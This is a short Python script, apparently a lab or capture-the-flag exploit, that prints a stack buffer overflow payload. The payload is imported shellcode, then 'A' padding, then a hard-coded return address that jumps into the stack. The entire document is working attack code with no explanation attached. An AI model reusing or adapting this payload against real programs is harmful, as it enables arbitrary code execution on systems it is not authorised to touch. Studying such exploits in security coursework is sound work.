from shellcode import shellcode
from struct import pack
import sys

sys.stdout.buffer.write(shellcode + b"\x41"*77 + b"\x41"*12 + pack("<I",0xFFFEFB7C))
